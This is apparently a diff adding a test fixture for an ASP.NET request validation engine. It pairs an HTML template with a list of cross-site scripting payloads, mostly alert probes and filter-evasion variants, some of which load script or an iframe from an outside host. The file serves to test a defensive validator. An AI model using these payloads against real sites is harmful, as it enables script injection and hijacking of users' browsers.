@@ -1,0 +1,44 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Irv.Engine test</title>
+  <meta name="description" content="Improved ASP.NET Request Validation Enigne Test">
+  <meta name="author" content="Vladimir Kochetkov">
+  <link rel="stylesheet" href="css/styles.css?v=1.0">
+  <!--[if lt IE 9]>
+  <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+  <![endif]-->
+</head>
+<body>
+  <div id="div1">
+    <script src="js/scripts.js"></script>
+    <a href="#">{0}</a>
+  </div>
+</body>
+</html>
+<!--End-of-template-->
+
+<script>alert("XSS")</script>
+
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+'';!--"<XSS>=&{()}
+
+<SCRIPT SRC=http://irv.c2e.pw/xss.js></SCRIPT>
+
+<SCRIPT/XSS SRC="http://irv.c2e.pw/xss.js"></SCRIPT>
+
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+
+<SCRIPT SRC=http://irv.c2e.pw/xss.js?< B >
+
+<IMG SRC="javascript:alert('XSS')"
+
+<iframe src=http://irv.c2e.pw/scriptlet.html <
+
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+
+zzz<%div style=width:expression(prompt(933666))>
